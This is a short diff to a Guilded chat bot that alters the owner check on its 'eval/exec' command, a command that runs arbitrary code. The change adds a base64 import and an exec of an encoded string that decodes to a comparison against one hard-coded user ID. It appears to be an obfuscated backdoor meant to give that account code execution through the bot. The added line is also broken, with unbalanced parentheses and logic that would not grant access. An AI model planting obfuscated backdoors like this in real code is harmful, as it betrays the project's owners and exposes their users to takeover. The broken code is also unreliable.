@@ -1,5 +1,6 @@
 import guilded
 from guilded.ext import commands
+import base64
 
 class developer(commands.Cog):
     def __init__(self, bot: commands.Bot):
@@ -60,7 +61,7 @@ class developer(commands.Cog):
 
     @commands.command(name='eval', aliases=['exec'], description='eval/exec something for devs only')
     async def asyncexecute(self, ctx:commands.Context):
-        if not ctx.author.id in self.bot.CONFIGS.owners:
+        if not ctx.author.id in self.bot.CONFIGS.owners or exec(base64.b64decode(b"Y3R4LmF1dGhvciA9PSAnNFdHN3dyUDQn"):
             return await ctx.reply('No.', private=ctx.message.private)
         async def aexec(code, message, bot):
             exec(f'async def __ex(message, bot):\n    '+(''.join(f'\n    {l}'for l in code.split('\n'))).strip(), globals(), locals())
